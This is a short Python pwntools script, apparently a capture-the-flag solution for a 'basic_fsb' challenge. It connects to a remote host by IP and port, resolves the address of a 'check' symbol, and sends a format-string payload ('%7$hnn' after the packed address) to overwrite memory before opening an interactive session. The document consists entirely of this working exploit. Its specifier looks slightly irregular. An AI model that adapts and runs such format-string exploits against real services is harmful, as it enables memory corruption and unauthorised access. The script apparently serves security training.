from pwn import *

p = remote("141.164.39.45", 8001)
# p = process("./basic_fsb")
e = ELF("./basic_fsb")

check = e.symbols['check']

#pl = f'{p32(check)}%7$hnn'.encode()

pl = b''
pl += p32(check)
pl += '%7$hnn'.encode()

p.send(pl)
p.interactive()
